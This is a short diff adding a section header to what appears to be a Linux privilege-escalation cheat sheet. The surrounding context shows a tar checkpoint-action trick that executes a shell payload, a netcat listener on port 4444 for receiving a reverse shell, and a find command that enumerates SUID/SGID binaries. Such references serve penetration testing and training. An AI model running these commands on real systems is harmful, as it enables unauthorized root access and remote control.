@@ -360,6 +360,8 @@ tar czf /tmp/backup.tar.gz --checkpoint=1 --checkpoint-action=exec=shell.elf
 nc -nvlp 4444
 ```
 
+## CATEGORY "SUID / SGID EXECUTEABLES" - SHELL ESCAPE BINARIES
+
 ## CATEGORY "SUID / SGID EXECUTEABLES" - KNOWN EXPLOITS
 ```
 find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
